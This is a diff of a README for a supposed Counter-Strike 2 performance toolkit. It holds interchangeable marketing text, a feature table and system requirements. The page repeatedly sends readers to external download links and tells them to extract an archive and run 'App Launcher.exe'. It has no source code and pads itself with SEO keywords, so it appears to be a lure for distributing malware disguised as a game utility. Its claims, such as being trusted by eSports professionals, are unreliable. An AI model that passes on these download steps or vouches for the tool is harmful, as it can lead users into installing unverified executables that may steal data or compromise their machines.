@@ -1,47 +1,27 @@
 # VRedux CS2 Performance Toolkit
 
 <div align="center">
-<img src="https://up-game.pro/wp-content/uploads/2023/01/260201.png" alt="VRedux CS2 Toolkit Logo" width="900">
-</div>  
-<br>
+  <img src="https://up-game.pro/wp-content/uploads/2023/01/260201.png" alt="Project Logo"/>
+</div>
 
 <div align="center">
-  
+
   [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://vredux-cs2-toolkit.github.io/.github/)
-</div>
-
----
-
-## 📥 Installation Instructions for Windows
-
-1. Download and extract the archive  
-2. Run `App Launcher.exe`  
-3. Open the toolkit interface  
-4. Follow on-screen setup instructions  
-
----
-
-<div align="center">
-<img src="https://i.imgur.com/t6I7vnE.png" width="800">
-</div>
-
-<div align="center">
- [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://git-launcher.com/)
 </div>
 
 ---
 
 ## 🖌 Overview
 
-VRedux CS2 Performance Toolkit is a system optimization and diagnostic assistant developed for Counter-Strike 2 players who want a smoother and more stable experience. It provides real-time monitoring, benchmark tools, and guided recommendations that help users tune their Windows systems for maximum gaming efficiency.  
+VRedux CS2 Performance Toolkit is a professional optimization and monitoring platform tailored for Counter-Strike 2 players seeking maximum efficiency, smooth gameplay, and stable FPS performance. Built for competitive gamers and technical enthusiasts, it provides detailed performance analytics, frame-time tracking, and advanced optimization modules that enhance system responsiveness.  
 
-The toolkit focuses on CPU and GPU balance, power management, memory usage, and frame-time stability. With a lightweight interface, it displays live metrics such as frame rate, input latency, and background resource usage to identify bottlenecks that can cause stutter or desync.  
+The toolkit integrates seamlessly with Windows, allowing users to adjust CPU and GPU performance, monitor system temperatures, and optimize background processes for improved in-game stability. Its intuitive interface makes it easy to visualize key performance metrics and identify bottlenecks affecting gameplay performance.  
 
-VRedux CS2 Toolkit also offers automated cleaning routines for cache files, startup services, and network latency testing tools to improve responsiveness. All optimizations are non-invasive, ensuring system and game integrity.  
+Designed using modern diagnostic algorithms, VRedux CS2 Performance Toolkit ensures low-latency responsiveness by managing memory allocation, prioritizing system tasks, and adjusting power profiles dynamically. The lightweight architecture minimizes overhead, ensuring efficient operation without interfering with gameplay.  
 
-Built with stability and security in mind, the application follows Microsoft and Valve compatibility guidelines and uses only documented Windows APIs. It can serve both casual gamers and professionals looking for a clean, distraction-free way to ensure consistent gameplay.  
+Ideal for both casual and professional players, the toolkit provides actionable insights into game performance, including real-time FPS charts, hardware usage graphs, and recommended system tuning profiles. It is trusted by streamers, eSports professionals, and enthusiasts optimizing their setups for consistent frame rates and better reaction times.  
 
-VRedux CS2 Toolkit is designed to work across all major Windows versions, making it one of the most practical utilities for maintaining system health and game performance over time.  
+Unlike generic system cleaners or boosters, VRedux CS2 Performance Toolkit focuses exclusively on Counter-Strike 2 compatibility, providing reliable benchmarking, quick presets, and continuous system monitoring that evolves with each CS2 update.  
 
 ---
 
@@ -49,12 +29,42 @@ VRedux CS2 Toolkit is designed to work across all major Windows versions, making
 
 | Feature | Description |
 |----------|-------------|
-| Performance Analyzer | Detects CPU/GPU bottlenecks in real time |
-| FPS Stabilizer | Suggests safe configuration changes to smooth frame pacing |
-| Network Diagnostics | Monitors ping, jitter, and packet loss |
-| Cache Cleaner | Removes redundant temporary data |
-| Auto-Tune Mode | Adjusts system power and background settings |
-| Process Monitor | Identifies heavy background processes during gameplay |
+| FPS Analyzer | Tracks frame rate and frame-time metrics in real time |
+| Latency Optimizer | Minimizes system input lag and network delay |
+| Hardware Monitor | Displays CPU, GPU, and memory utilization |
+| Thermal Control | Manages temperatures to prevent throttling |
+| Auto-Tuning Mode | Automatically applies game-specific performance profiles |
+| Clean UI Dashboard | Simple interface for quick performance overview |
+
+---
+
+### 🔄 Recent Updates
+
+- Added adaptive FPS monitoring  
+- Improved GPU and memory optimization modules  
+- Enhanced compatibility with latest CS2 updates  
+- Streamlined Windows integration for faster response  
+- Improved background process management and stability  
+
+---
+
+### 🏆 Who Uses It
+
+- **eSports Professionals** – ensure competitive-grade responsiveness  
+- **Streamers** – maintain stable frame rates while broadcasting  
+- **System Tweakers** – fine-tune Windows settings for gaming  
+- **PC Builders** – test and benchmark hardware performance  
+- **Casual Gamers** – get smoother and more consistent gameplay  
+
+---
+
+### 📚 Getting Started
+
+1. Visit the GitHub page.  
+2. Download the latest official build.  
+3. Launch the app and follow setup steps.  
+4. Monitor FPS, CPU, and GPU performance in real time.  
+5. Apply optimization profiles to enhance gameplay.  
 
 ---
 
@@ -66,18 +76,16 @@ VRedux CS2 Toolkit is designed to work across all major Windows versions, making
 | Processor | Intel Core i5 | Intel Core i7 / AMD Ryzen 7 |
 | RAM | 8 GB | 16 GB |
 | Storage | 2 GB | SSD recommended |
-| Display | 1280 × 800 | 1920 × 1080 or higher |
+| GPU | GTX 1060 / RX 580 | RTX 3060 / RX 6700 XT |
+| Display | 1280×800 | 1920×1080 or higher |
 
 ---
 
 🧩 MIT License (2025)  
-This project is licensed under the [MIT License](https://opensource.org/license/MIT) – you are free to use, change, and distribute the code.
+This project is licensed under the [MIT License](https://opensource.org/license/MIT).
 
 ---
 
 ### 🏷 SEO Keywords
 
-cs2 performance toolkit, counter strike 2 optimizer, cs2 fps boost, cs2 performance analyzer, cs2 stutter fix, cs2 optimization tool, gaming performance toolkit, cs2 input latency monitor, cs2 windows optimization, low ping cs2, fps monitor cs2, system optimization for games, game diagnostics windows, cs2 fps stabilizer, cs2 toolkit download, counter strike 2 performance tool, cs2 windows tuner, gaming performance analyzer
-
----
-
+cs2 performance toolkit, counter strike 2 optimization, fps booster for cs2, cs2 graphics optimizer, cs2 latency reducer, cs2 fps monitor, windows gaming performance tool, cs2 benchmarking software, gpu tuning for cs2, cs2 frame rate analyzer, cs2 settings optimizer, fps tracker for windows, cs2 performance analyzer, gaming optimization utility, cs2 system monitor, low latency gaming tools, cs2 diagnostics toolkit, windows fps optimization
